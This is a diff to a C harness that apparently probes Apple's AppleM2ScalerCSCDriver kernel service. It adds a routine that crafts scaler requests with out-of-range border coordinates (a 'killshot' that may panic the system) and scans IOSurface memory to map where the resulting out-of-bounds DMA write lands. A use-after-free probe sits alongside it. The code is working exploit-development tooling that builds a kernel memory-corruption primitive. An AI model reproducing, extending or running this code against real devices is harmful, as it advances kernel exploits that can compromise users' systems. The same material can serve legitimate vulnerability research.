@@ -15605,6 +15605,147 @@ static void p_dartaim(void) {
     LOG("[dartaim] done (alive)");
 }
 
+// V96: where does the wrap write actually land? Mark small src/dst (0x5A),
+// killshot, CPU-readback of ALL mapped surfaces. Steps (FUZZ_DART_STEP):
+// 0 = small only (baseline); 1 = big sponge mapped BEFORE small dst;
+// 2 = small dst first, big sponge after.
+static long dart_scan(IOSurfaceRef s, uint8_t expect, uint8_t *firstbytes) {
+    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL)) return -1;
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(s);
+    size_t total = (size_t)IOSurfaceGetAllocSize(s);
+    long bad = 0;
+    size_t first = 0;
+    for (size_t i = 0; i < total; i++)
+        if (base[i] != expect) { if (!bad) { first = i; memcpy(firstbytes, base + i, 16); } bad++; }
+    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
+    if (bad) LOG("[dartw]   scan: %ld/%zx bytes differ from %02x, first @0x%zx: %02x %02x %02x %02x %02x %02x %02x %02x",
+                 bad, total, expect, first,
+                 firstbytes[0], firstbytes[1], firstbytes[2], firstbytes[3],
+                 firstbytes[4], firstbytes[5], firstbytes[6], firstbytes[7]);
+    return bad;
+}
+static void p_dartwrite(void) {
+    int step = atoi(getenv("FUZZ_DART_STEP") ?: "0");
+    LOG("[dartw] v96 step %d", step);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    IOSurfaceRef b1 = NULL, b2 = NULL;
+    IOSurfaceRef s = make_surface(64, 64);
+    IOSurfaceRef d = make_surface(64, 64);
+    if (!s || !d) return;
+    // fill small surfaces with 0x5A
+    for (int k = 0; k < 2; k++) {
+        IOSurfaceRef t = k ? d : s;
+        if (IOSurfaceLock(t, 0, NULL) == 0) {
+            memset(IOSurfaceGetBaseAddress(t), 0x5A, IOSurfaceGetAllocSize(t));
+            IOSurfaceUnlock(t, 0, NULL);
+        }
+    }
+    if (step == 1) {
+        // big sponge BEFORE small surfaces
+        b1 = make_surface(2048, 2048);
+        b2 = make_surface(2048, 2048);
+        craft_transform(req, IOSurfaceGetID(b1), IOSurfaceGetID(b2), 2048, 2048);
+        LOG("[dartw] big map first -> kr 0x%08x", scaler_call1(c, req));
+        usleep(200000);
+    }
+    IOSurfaceID si = IOSurfaceGetID(s), di = IOSurfaceGetID(d);
+    craft_transform(req, si, di, 64, 64);
+    LOG("[dartw] wire small -> kr 0x%08x", scaler_call1(c, req));
+    usleep(50000);
+    if (step == 2) {
+        b1 = make_surface(2048, 2048);
+        b2 = make_surface(2048, 2048);
+        craft_transform(req, IOSurfaceGetID(b1), IOSurfaceGetID(b2), 2048, 2048);
+        LOG("[dartw] big map after small -> kr 0x%08x", scaler_call1(c, req));
+        usleep(200000);
+        // re-fill small markers (the big scale doesn't touch them, but be sure)
+        for (int k = 0; k < 2; k++) {
+            IOSurfaceRef t = k ? d : s;
+            if (IOSurfaceLock(t, 0, NULL) == 0) {
+                memset(IOSurfaceGetBaseAddress(t), 0x5A, IOSurfaceGetAllocSize(t));
+                IOSurfaceUnlock(t, 0, NULL);
+            }
+        }
+        craft_transform(req, si, di, 64, 64);
+        scaler_call1(c, req);
+        usleep(50000);
+    }
+    if (step == 3) {
+        // giant dst: corruption offset inside it = write-start formula readout
+        int w = atoi(getenv("FUZZ_DART_SIZE") ?: "4096");
+        IOSurfaceRef gs = make_surface(64, 64);
+        IOSurfaceRef gd = make_surface(w, w);
+        if (!gs || !gd) { LOG("[dartw] giant surfaces failed"); return; }
+        if (IOSurfaceLock(gd, 0, NULL) == 0) {
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(gd);
+            size_t total = (size_t)IOSurfaceGetAllocSize(gd);
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                memset(base + p, (int)((p >> 12) & 0xff), 0x1000);
+            IOSurfaceUnlock(gd, 0, NULL);
+        }
+        IOSurfaceID gsi = IOSurfaceGetID(gs), gdi = IOSurfaceGetID(gd);
+        craft_transform(req, gsi, gdi, 64, 64);
+        LOG("[dartw] giant dst %dx%d wire -> kr 0x%08x", w, w, scaler_call1(c, req));
+        usleep(1000000);   // full 1s settle before markers
+        // re-fill markers AFTER the wire completes
+        if (IOSurfaceLock(gd, 0, NULL) == 0) {
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(gd);
+            size_t total = (size_t)IOSurfaceGetAllocSize(gd);
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                memset(base + p, (int)((p >> 12) & 0xff), 0x1000);
+            IOSurfaceUnlock(gd, 0, NULL);
+        }
+        if (getenv("FUZZ_DART_NOSHOT")) {
+            LOG("[dartw] NOSHOT control — no killshot");
+        } else {
+            border_payload(req, gsi, gdi, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+            LOG("[dartw] giant killshot (PANIC possible)...");
+            kern_return_t kr2 = scaler_call1(c, req);
+            LOG("[dartw] giant killshot -> kr 0x%08x", kr2);
+        }
+        usleep(100000);
+        if (IOSurfaceLock(gd, kIOSurfaceLockReadOnly, NULL) == 0) {
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(gd);
+            size_t total = (size_t)IOSurfaceGetAllocSize(gd);
+            long bad = 0; size_t first = 0, last = 0;
+            int pagebad[16]; size_t pageoff[16]; int npg = 0;
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
+                int cnt = 0;
+                for (size_t i = p; i < p + 0x1000; i++)
+                    if (base[i] != (uint8_t)((p >> 12) & 0xff)) cnt++;
+                if (cnt) {
+                    if (!bad) first = p;
+                    last = p + 0x1000 - 1; bad += cnt;
+                    if (npg < 16) { pagebad[npg] = cnt; pageoff[npg] = p; npg++; }
+                }
+            }
+            LOG("[dartw] giant dst: %ld bytes differ, first @0x%zx last @0x%zx, corrupt pages ~%ld",
+                bad, first, last, bad / 4096);
+            for (int k = 0; k < npg; k++)
+                LOG("[dartw]   page @0x%zx: %d bad bytes, [0..7] %02x %02x %02x %02x %02x %02x %02x %02x",
+                    pageoff[k], pagebad[k],
+                    base[pageoff[k]], base[pageoff[k]+1], base[pageoff[k]+2], base[pageoff[k]+3],
+                    base[pageoff[k]+4], base[pageoff[k]+5], base[pageoff[k]+6], base[pageoff[k]+7]);
+            IOSurfaceUnlock(gd, kIOSurfaceLockReadOnly, NULL);
+        }
+        LOG("[dartw] giant done (alive)");
+        return;
+    }
+    border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+    LOG("[dartw] killshot (PANIC possible)...");
+    kern_return_t kr = scaler_call1(c, req);
+    LOG("[dartw] killshot -> kr 0x%08x", kr);
+    usleep(100000);
+    uint8_t fb[16];
+    LOG("[dartw] small SRC scan:");  dart_scan(s, 0x5A, fb);
+    LOG("[dartw] small DST scan:");  dart_scan(d, 0x5A, fb);
+    if (b1) { LOG("[dartw] big SRC scan (expect 00):"); dart_scan(b1, 0x00, fb); }
+    if (b2) { LOG("[dartw] big DST scan (expect 00):"); dart_scan(b2, 0x00, fb); }
+    LOG("[dartw] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -15735,6 +15876,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_DARTWRITE")) { p_dartwrite(); LOG("[probe13] dartwrite-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTVAL")) { p_dartval(); LOG("[probe13] dartval-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTAIM")) { p_dartaim(); LOG("[probe13] dartaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTMAP")) { p_dartmap(); LOG("[probe13] dartmap-only mode, stop"); return NULL; }
